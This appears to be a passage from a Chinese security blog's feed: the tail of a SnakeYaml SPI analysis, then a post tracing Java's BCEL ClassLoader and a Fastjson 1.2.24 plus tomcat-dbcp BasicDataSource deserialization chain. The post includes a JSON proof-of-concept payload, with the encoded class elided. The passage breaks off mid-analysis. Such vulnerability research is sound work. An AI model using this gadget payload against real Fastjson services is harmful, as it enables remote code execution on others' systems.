&lt;p&gt;这块实例化的顺序是 &lt;code&gt;URL(String)&lt;/code&gt;  -&amp;gt;&lt;code&gt;URLClassLoader(URL[])&lt;/code&gt; -&amp;gt; &lt;code&gt;ScriptEngineManager&lt;/code&gt;，我们跟进一下&lt;code&gt;ScriptEngineManager&lt;/code&gt;的&lt;code&gt;newInstance&lt;/code&gt;这里。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919172311.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919172347.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919172422.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;调用了&lt;code&gt;ScriptEngineManager&lt;/code&gt;的单参构造函数进行初始化，这里随着图示断点跟进几步来到了&lt;code&gt;getServiceLoader()&lt;/code&gt;这里，感觉是关键，跟进去看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919174614.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919174828.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230919174930.png&quot; alt=&quot;&quot; /&gt;
发现是这么个样，和我们上面给的demo差不多，些许不同的是这里自己指定了类加载器，也就是我们之前所设的&lt;code&gt;URLClassLoader&lt;/code&gt;来加载&lt;code&gt;ScriptEngineFactory&lt;/code&gt;接口的实现类，不过因为这里是SPI的底层其实是懒加载的模式，并不会在此就把类给加载出来，而是在迭代的时候再进行加载。所以我们要步出回到&lt;code&gt;initEngines()&lt;/code&gt;继续分析。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920000613.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;还是和基本demo那里给的差不多，先是通过&lt;code&gt;sl&lt;/code&gt;获得一个迭代器，看了下官方文档的解释,这个迭代器里面的&lt;code&gt;hasNext()&lt;/code&gt;就是懒加载实现的地方，首先会到providers中去查找有没有存在的实例，有就直接返回，没有再到LazyIterator中查找，我们接着步出往下跟。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920002006.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010046.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在120行就调用了&lt;code&gt;hasNext()&lt;/code&gt;，跟进后调了调，开始了懒加载（预设置部分），这里接着跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010233.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010441.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进&lt;code&gt;hasNextService()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010648.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;根据前缀和serviceName拼接得到加载位置，在348行这里，会根据我们所指定的位置，读取实现类的信息，我们步出往下看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920010815.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进&lt;code&gt;itr.next()&lt;/code&gt;这里，这里没什么需要特别分析的，基本是刚点进去就得跟进，最终实在&lt;code&gt;nextService&lt;/code&gt;这里实现了类的实例化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011253.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011614.png&quot; alt=&quot;&quot; /&gt;
最终运行结果如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230920011903.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>BCEL的简单学习</title><link>https://f4miti0n.github.io/posts/bcel-classloader/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/bcel-classloader/</guid><pubDate>Tue, 12 Sep 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;BCEL介绍&lt;/h3&gt;
&lt;p&gt;BCEL（Byte Code Engineering Library）是一个用于分析、修改和创建Java字节码的开源库。它提供了一组强大的工具和API，可用于动态修改和生成Java类文件。
BCEL的主要功能包括以下几个方面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;字节码分析：BCEL可以加载和解析现有的Java类文件，提供了访问类、方法、字段和指令等各种元素的接口。通过这些接口，开发人员可以深入研究类的内部结构和操作指令，从而进行静态分析和检查。&lt;/li&gt;
&lt;li&gt;字节码修改：BCEL允许开发人员直接修改已加载的类文件的字节码。可以添加、删除或修改类、方法和字段，并重新保存修改后的文件。这使得BCEL成为处理字节码的有力工具，广泛应用于AOP（面向切面编程）等领域。&lt;/li&gt;
&lt;li&gt;字节码生成：BCEL还提供了一组API，用于动态生成新的Java类文件。开发人员可以使用BCEL创建类、方法、字段和操作指令，然后将其编译成有效的字节码文件。这对于编写动态代理、字节码增强等需要在运行时生成类的场景非常有用。&lt;/li&gt;
&lt;li&gt;反序列化和代码执行：BCEL在测试反序列化漏洞和执行动态生成的代码时非常有用。它可以帮助分析和处理序列化的对象，并提供了执行相关操作的接口。这在一些场景下，如利用漏洞进行远程代码执行时，是非常实用的工具。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，BCEL是一个功能强大的Java字节码工程库，用于分析、修改和创建Java类文件。它具有广泛的应用领域，包括静态分析、字节码增强、动态代理、反序列化测试等。&lt;/p&gt;
&lt;h3&gt;BCEL源码浅析&lt;/h3&gt;
&lt;p&gt;jdk的版本这里用的是神奇的jdk8u66，在jdk&amp;lt;8u251的情况下，我们都能在&lt;code&gt;com.sun.org.apache.bcel.internal.util&lt;/code&gt;里面找到&lt;code&gt;ClassLoader&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;BCELDemo&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class BCELDemo {  
    public static void main(String[] args) throws Exception {    
        JavaClass cls = Repository.lookupClass(calc.class);  
        String code = Utility.encode(cls.getBytes(), true);  
        System.out.println(code);  
        new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + code).newInstance();  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;分析点是&lt;code&gt;loadClass()&lt;/code&gt;这里的，由于双亲委派机制的原因，这里就不一步一步跟了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230907114517.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;直接来到&lt;code&gt;com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass()&lt;/code&gt;这里，这里&lt;code&gt;cl&lt;/code&gt;对象显然就是我们的关注重点，盘一下代码逻辑，能够看到先会根据所传入的&lt;code&gt;class_name&lt;/code&gt;尝试从已有的&lt;code&gt;classes&lt;/code&gt;中加载中该类，如果&lt;code&gt;classes&lt;/code&gt;的确存在该类,则直接跳过返回&lt;code&gt;cl&lt;/code&gt;对象，如果&lt;code&gt;classes&lt;/code&gt;中不存在该类，则再通过&lt;code&gt;class_name&lt;/code&gt;判定将加载的类是否是系统内部类，如果确实为系统内部类，则调用自带的类加载器进行加载，如果不为系统内部类，则继续往下进行。因为我们这里加载的类是我们自定义的恶意类，所以我们还得接着跟进一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230907114906.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230907115724.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最终是来到了&lt;code&gt;createClass()&lt;/code&gt;这里，我们跟进去分析一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230907115948.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;代码逻辑非常简单，就是把传入的&lt;code&gt;classname&lt;/code&gt;的前八个字符给砍了，再把剩下的字符decode成正常的字节码bytes数组(decode方法参数uncompress用来标识是否为zip流，当为true时走zip流解码)，在用之后生成的类解析器对bytes数组进行解析，得到一个崭新的&lt;code&gt;JavaClass&lt;/code&gt;对象。具体的解析流程和解码流程这里不在深究，让我们出栈回到&lt;code&gt;loadClasses()&lt;/code&gt;里面继续分析。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230907120239.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之后就是调用Java原生的&lt;code&gt;defineClass()&lt;/code&gt;进行类加载，这里的clazz经过调试已经变成了我们设置的恶意类，到此基本BCEL的类加载流程就趋向结尾了，此后就是&lt;code&gt;newInstance()&lt;/code&gt;进行静态加载的事儿了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230907121850.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;简单利用姿势&lt;/h3&gt;
&lt;h4&gt;Fastjson与BCEL&lt;/h4&gt;
&lt;h5&gt;环境准备&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;pom.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;1.2.24&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;!--fastjson&amp;lt;=1.2.36--&amp;gt;
&amp;lt;dependency&amp;gt;
	&amp;lt;groupId&amp;gt;org.apache.tomcat&amp;lt;/groupId&amp;gt;
	&amp;lt;artifactId&amp;gt;tomcat-dbcp&amp;lt;/artifactId&amp;gt;
	&amp;lt;version&amp;gt;9.0.20&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;poc&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
        &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
        &quot;driverClassLoader&quot;: {
            &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
        },
        &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b......&quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h5&gt;流程分析&lt;/h5&gt;
&lt;p&gt;sink 在这一句代码上，最终是定位到了&lt;code&gt;org.apache.tomcat.dbcp.dbcp2.DriverFactory#createDriver()&lt;/code&gt;执行的关键位置如图中断点所示，说句实话，这个sink点有些过于完美了，&lt;code&gt;driverClassName&lt;/code&gt;和&lt;code&gt;driverClassLoader&lt;/code&gt; 都由我们所传参数所决定。继续对&lt;code&gt;createDriver()&lt;/code&gt;做一下回溯。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + code).newInstance();  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908151847.png&quot; alt=&quot;&quot; /&gt;
查找用法之后发现只有&lt;code&gt;org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()&lt;/code&gt; 这一个地方调用了它，对&lt;code&gt;createConnectionFactory()&lt;/code&gt;再回溯一下。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908152413.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource()&lt;/code&gt;下找到调用点，接着再往前回溯。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908153155.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908153245.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;随便查找一下用法就掉宝了，直接出来两个getter方法。&lt;s&gt;根据Fastjson调用任意getter方法的特点，到这一步就可以与Fastjson链衔接形成闭环了&lt;/s&gt;。但是因为这两个方法的返回值类型并不满足Fastjson的调用条件（具体条件可以看&lt;code&gt;Fastjson初探&lt;/code&gt;那篇文章），所以并不能简单地认为该链子就到此结束了。在这里，我们可以引入一个Fastjson的小trick来解决这个问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908154221.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908154508.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908154532.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;先抛开以上链子不谈，咱们重新复习一下&lt;code&gt;JSON.parse()&lt;/code&gt;和&lt;code&gt;JSON.parseObject()&lt;/code&gt;的区别（最常见的单参版本）。不难看出&lt;code&gt;parseObject()&lt;/code&gt;的底层实现，本质是对&lt;code&gt;parse()&lt;/code&gt;进行了一个简单的封装，将最终的解析对象统一转换为 &lt;code&gt;JSONObject&lt;/code&gt;类型 。而转换的过程是涉及到了一个&lt;code&gt;JSON.toJSON&lt;/code&gt;的神奇方法，我们可以跟进去看一看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908175812.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230908180158.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里是连同重载，把两处方法都给记录了下来&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public static Object toJSON(Object javaObject) {  
    return toJSON(javaObject, SerializeConfig.globalInstance);  
}
---------------------------------------------------------------------
public static Object toJSON(Object javaObject, SerializeConfig config) {  
    if (javaObject == null) {  
        return null;  
    }  
    if (javaObject instanceof JSON) {  
        return javaObject;  
    }  
    if (javaObject instanceof Map) {  
        Map&amp;lt;Object, Object&amp;gt; map = (Map&amp;lt;Object, Object&amp;gt;) javaObject;  
        JSONObject json = new JSONObject(map.size());  
        for (Map.Entry&amp;lt;Object, Object&amp;gt; entry : map.entrySet()) {  
            Object key = entry.getKey();  
            String jsonKey = TypeUtils.castToString(key);  
            Object jsonValue = toJSON(entry.getValue());  
            json.put(jsonKey, jsonValue);  
        }  
        return json;  
    }  
    if (javaObject instanceof Collection) {  
        Collection&amp;lt;Object&amp;gt; collection = (Collection&amp;lt;Object&amp;gt;) javaObject;  
        JSONArray array = new JSONArray(collection.size());  
        for (Object item : collection) {  
            Object jsonValue = toJSON(item);  
            array.add(jsonValue);  
        }  
        return array;  
    }  
    Class&amp;lt;?&amp;gt; clazz = javaObject.getClass();  
    if (clazz.isEnum()) {  
        return ((Enum&amp;lt;?&amp;gt;) javaObject).name();  
    }  
    if (clazz.isArray()) {  
        int len = Array.getLength(javaObject);  
        JSONArray array = new JSONArray(len);  
        for (int i = 0; i &amp;lt; len; ++i) {  
            Object item = Array.get(javaObject, i);  
            Object jsonValue = toJSON(item);  
            array.add(jsonValue);  
        }  
        return array;  
    }  
    if (ParserConfig.isPrimitive(clazz)) {  
        return javaObject;  
    }  
    ObjectSerializer serializer = config.getObjectWriter(clazz);  
    if (serializer instanceof JavaBeanSerializer) {  
        JavaBeanSerializer javaBeanSerializer = (JavaBeanSerializer) serializer;  
        JSONObject json = new JSONObject();  
        try {  
            Map&amp;lt;String, Object&amp;gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);  
            for (Map.Entry&amp;lt;String, Object&amp;gt; entry : values.entrySet()) {  
                json.put(entry.getKey(), toJSON(entry.getValue()));  
            }  
        } catch (Exception e) {  
            throw new JSONException(&quot;toJSON error&quot;, e);  
        }  
        return json;  
    }       
    String text = JSON.toJSONString(javaObject);  
    return JSON.parse(text);  
}

--------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就像我们之前在&lt;code&gt;Fastjson初探&lt;/code&gt;里面提到过的那样，&lt;code&gt;toJSON()&lt;/code&gt;会依据我们的javaObject的类型，进行相应的处理，如果javaObject是自定义的javaBean，那么则会在&lt;code&gt;javaBeanSerializer.getFieldValuesMap(javaObject)&lt;/code&gt;这里通过反射进行属性值的获取，我们的任意getter执行，也是在这里实现的。而&lt;code&gt;parse()&lt;/code&gt; 仅仅负责&lt;code&gt;setter&lt;/code&gt;方法的执行与获取，但事实果真如此吗？我们这里要通过以下Demo重新认识一下&lt;code&gt;Fastjson&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class Person{  
    public String name;  
    public Integer age;  
    public  static Map map;  
    public Person() {  
    }  
    public Person(String name, Integer age) {  
        this.name = name;  
        this.age = age;  
    }  
    public  Map getMap() {  
        System.out.println(&quot;getMap&quot;);  
        return map;  
    }  
    public String getName() {  
        System.out.println(&quot;getName&quot;);  
        return name;  
    }  
    public void setName(String name) throws java.io.IOException {  
        System.out.println(&quot;setName&quot;);  
        this.name = name;  
    }  
    public Integer getAge() throws java.io.IOException{  
        System.out.println(&quot;getAge&quot;);  
        return age;  
    }  
    public void setAge(Integer age) {  
        System.out.println(&quot;setAge&quot;);  
        this.age = age;  
    }  
}
-------------------------------------------------------------------------
public class fastjsondemo {  
    public static void main(String[] args) throws java.io.IOException{  
        String s = &quot;{\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;name\&quot;:\&quot;xxx\&quot;,\&quot;age\&quot;:\&quot;16\&quot;,\&quot;map\&quot;:{}}&quot;;  
        Object jsonObject = JSON.parse(s);  
    }  
}
-------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Demo运行截图如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909140656.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;不难发现其实&lt;code&gt;parse()&lt;/code&gt;也可以对部分的getter进行调用，不过得满足一定的条件，我们可以对这个问题进行一些简单的探究（之前的Fastjson初探那篇文章写的不够细致）。&lt;/p&gt;
&lt;p&gt;对&lt;code&gt;parse()&lt;/code&gt;下个断点跟进几步，来到&lt;code&gt;com.alibaba.fastjson.parser.DefaultJSONParser&lt;/code&gt;的367、368行。这里首先跟进一下367行获取反序列化器这里进行调试，在跟进前几步的时候，会先根据所传入的&lt;code&gt;clazz&lt;/code&gt;对象的&lt;code&gt;Classtype&lt;/code&gt;从已有的反序列化器进行选择，因为我们这里的clazz对象是自己编写的Javabean，最终会新建一个&lt;code&gt;JavaBeanDeserializer&lt;/code&gt;返回给&lt;code&gt;deserializer&lt;/code&gt;，我们跟进看看&lt;code&gt;createJavaBeanDeserializer&lt;/code&gt; 这里。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909141537.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909142217.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;把一些用处不大的if结构缩略后得到下图。关键看箭头所指的部分，我们迫切的需要代码执行到这里返回一个新建可控的&lt;code&gt;JavaBeanDeserializer，&lt;/code&gt;而不是返回一个591行由asm所创建的&lt;code&gt;JavaBeanDeserializer&lt;/code&gt;（asm创建的反序列化器一方面是没法调试，一方面是不会调对象的&lt;code&gt;getter&lt;/code&gt;），而掌控这一切的关键则在第一个断点处的if结构里，我们展开看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909143007.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在539行可以看到asmEnable被赋为了false，只要执行到这里则必然能够获得自建的&lt;code&gt;JavaBeanDeserializer&lt;/code&gt;。而这里与&lt;code&gt;beanInfo&lt;/code&gt;的创建又是有相当密切的关系的，我们再跟进一下526的&lt;code&gt;JavaBeanInfo.build()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909143917.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;和&lt;code&gt;fieldList&lt;/code&gt;最密切相关的地方就在这三个for循环，第一个是对&lt;code&gt;setter&lt;/code&gt;方法进行的添加，第二个是对&lt;code&gt;fields&lt;/code&gt;属性遍历进行的添加，第三个是对&lt;code&gt;getter&lt;/code&gt;方法进行的添加，因为这里牵扯到了&lt;code&gt;fieldInfo&lt;/code&gt;的&lt;code&gt;getOnly&lt;/code&gt;属性，我们可以先去第三个for循环的add里面瞅瞅，看看这里&lt;code&gt;new FieldInfo&lt;/code&gt;的源码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909144658.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909145152.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;抛去不影响的部分，直接看看163到183行，发现这里会根据有多少个参数类型来对&lt;code&gt;getOnly&lt;/code&gt;属性进行赋值，因为我们传入的是get，自然就是0，所以只要能运行到getter循环的&lt;code&gt;new FieldInfo&lt;/code&gt;这里，就足以达成目的，我们重新回到getter循环那里看看运行到&lt;code&gt;new FieldInfo&lt;/code&gt;的条件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909150018.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在getter循环里假如FieldInfoList的条件如下所示，前面两张图的条件就是我们耳熟能详的那几条，但最后一张图里的条件，一般都会被默认忽视掉。在加入这个Field到FieldList之前，这个Field绝对不能在FieldList中已经存在，也就是说我们这里不允许在前两个循环就把我们的getMap调用的Field给加进到FieldList里。对于第一个循环而言，这里非常好讲，只需要对&lt;code&gt;map&lt;/code&gt;属性不设置&lt;code&gt;set&lt;/code&gt;方法即可，而第二个循环，则需要我们自己稍微跟一下代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909151835.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909151908.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909151934.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Field循环一进去的第一段代码就已经非常吸引我们的注意力了，可以发现只要将&lt;code&gt;map&lt;/code&gt;设置为静态属性，Field循环直接就能给跳过去，非常的nice。这也是为什么demo里面只有&lt;code&gt;map&lt;/code&gt;属性设置为&lt;code&gt;static&lt;/code&gt;的根本原因。到了这一步，我们就可以保证用来进行反序列化的反序列化器是由我们自己所创建的&lt;code&gt;JavaBeanDeserializer&lt;/code&gt;了，我们出栈看看&lt;code&gt;deserilzer.deserize()&lt;/code&gt;的执行流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909151756.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跳过不重要的部分，&lt;code&gt;deseriazle&lt;/code&gt;里面会对clazz的fieldList进行遍历，再根据属性自身的特性进行特定的&lt;code&gt;setValue&lt;/code&gt;调用。比如现在遍历到的属性是&lt;code&gt;String name&lt;/code&gt;，调用的&lt;code&gt;setValue&lt;/code&gt;就是
&lt;code&gt;fieldDeser.setValue&lt;/code&gt;最终调用&lt;code&gt;setName&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909153246.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909162520.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909162812.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;而别的属性的话，就比如我们的Map，调用的就是&lt;code&gt;parseField(parser, key, object, type, fieldValues)&lt;/code&gt;这里。我们可以跟进看一下，这里要稍微跳几步，直接分析&lt;code&gt;setValue&lt;/code&gt;里的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909163004.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909163147.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909163235.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;能够看到，在&lt;code&gt;setValue&lt;/code&gt;里，会对当前的fieldInfo.getOnly属性进行判断，如果当前属性为getOnly类型，且其类型符合我们之前&lt;code&gt;getter&lt;/code&gt;循环要求的类型，则在85行进行getMap的调用，到此我们实现了在&lt;code&gt;parse()&lt;/code&gt;里对于&lt;code&gt;getter&lt;/code&gt;方法的调用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/BCEL%20ClassLoader/Pasted%20image%2020230909163403.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;但这里的利用链显然不完善，只能调用那几个单调类型的getter是无法调用这里的&lt;code&gt;getConnection&lt;/code&gt;和&lt;code&gt;getLogWriter&lt;/code&gt;的，审计到了这一步，我们才来到了真正的重头戏，真正的开始引入前面所说的fastjson trick。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;重新审计源码，发现&lt;code&gt;com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)&lt;/code&gt;中，如果JSONObject位于JSON的key上，就会调用key的toString方法。
